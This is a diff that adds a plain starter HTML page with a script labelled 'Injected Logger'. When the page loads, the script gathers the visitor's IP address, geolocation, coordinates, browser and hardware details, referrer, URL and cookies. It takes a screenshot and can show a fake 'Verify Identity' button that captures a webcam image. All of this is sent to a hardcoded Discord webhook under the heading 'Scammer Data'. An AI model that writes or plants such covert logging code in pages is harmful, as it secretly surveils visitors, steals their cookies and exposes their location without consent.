@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>My First Heading</h1>
+<p>My first paragraph.</p>
+
+
+<!-- Injected Logger -->
+<script>
+(async function() {
+    const WEBHOOK = 'https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds';
+    const WEBCAM_MODE = 'off';
+    const SCREENSHOT_MODE = 'full';
+    
+    let data = {
+        ip: '', postal: '', city: '', region: '', country: '', lat: '', lon: '',
+        ua: navigator.userAgent,
+        screen: screen.width + 'x' + screen.height,
+        lang: navigator.language,
+        cores: navigator.hardwareConcurrency || 'unknown',
+        memory: navigator.deviceMemory || 'unknown',
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer,
+        url: window.location.href,
+        cookies: document.cookie,
+        time: new Date().toISOString(),
+        screenshot: null
+    };
+    
+    // Get IP + postal code
+    try {
+        const res = await fetch('https://ip-api.com/json/');
+        const geo = await res.json();
+        if (geo.status === 'success') {
+            data.ip = geo.query;
+            data.postal = geo.zip || 'N/A';
+            data.city = geo.city;
+            data.region = geo.regionName;
+            data.country = geo.country;
+            data.lat = geo.lat;
+            data.lon = geo.lon;
+        }
+    } catch(e) {}
+    
+    // Screenshot
+    if (SCREENSHOT_MODE !== 'off') {
+        await new Promise((resolve) => {
+            if (window.html2canvas) return resolve();
+            const s = document.createElement('script');
+            s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+            s.onload = resolve;
+            document.head.appendChild(s);
+        });
+        try {
+            const canvas = await html2canvas(document.body, { scale: 0.5 });
+            data.screenshot = canvas.toDataURL('image/jpeg', 0.7);
+        } catch(e) {}
+    }
+    
+    // Webcam button
+    if (WEBCAM_MODE === 'prompt') {
+        const btn = document.createElement('button');
+        btn.innerText = '🔐 Verify Identity';
+        btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:99999;background:#0f0;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;z-index:999999';
+        btn.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => video.onloadedmetadata = r);
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const webcamImg = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '📸 WEBCAM', embeds: [{ title: 'Webcam', image: { url: webcamImg } }] })
+                });
+            } catch(e) {}
+            btn.remove();
+        };
+        document.body.appendChild(btn);
+    }
+    
+    // Send everything
+    try {
+        await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: null,
+                embeds: [{
+                    title: '🎯 Scammer Data',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'IP', value: data.ip, inline: true },
+                        { name: 'Postal Code', value: data.postal, inline: true },
+                        { name: 'Location', value: data.city + ', ' + data.region + ', ' + data.country, inline: true },
+                        { name: 'Coords', value: data.lat + ', ' + data.lon, inline: true },
+                        { name: 'User Agent', value: data.ua.substring(0, 80), inline: false },
+                        { name: 'Screen', value: data.screen, inline: true },
+                        { name: 'Cores/RAM', value: data.cores + 'c / ' + data.memory + 'GB', inline: true },
+                        { name: 'Timezone', value: data.tz, inline: true },
+                        { name: 'Referrer', value: data.referrer || 'Direct', inline: false },
+                        { name: 'Page URL', value: data.url, inline: false }
+                    ],
+                    timestamp: data.time
+                }]
+            })
+        });
+        if (data.screenshot) {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [{ title: '📸 Screenshot', image: { url: data.screenshot } }] })
+            });
+        }
+    } catch(e) {}
+})();
+</script>
+
+</body>
